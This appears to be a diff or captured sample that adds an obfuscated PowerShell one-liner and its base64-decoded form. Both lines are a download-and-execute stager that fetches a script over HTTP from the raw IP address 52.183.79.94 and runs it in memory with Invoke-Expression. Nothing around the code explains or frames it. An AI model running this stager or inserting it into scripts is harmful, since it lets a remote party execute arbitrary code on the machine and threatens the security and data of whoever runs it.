@@ -1,0 +1,7 @@
+iex([SYSteM.TeXt.encodING]::UTF8.getStrINg([SYStEM.cONvErT]::FrOMBaSe64StRINg('CmlleCAoTmV3LU9iamVjdCBORVQud2ViY2xJRW50KS5ET3dOTG9hZHNUUmluZygiaHR0cDovLzUyLjE4My43OS45NDo4MC9UWUJNa1Rmc1EiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+iex (New-Object NET.webclIEnt).DOwNLoadsTRing("http://52.183.79.94:80/TYBMkTfsQ")
+
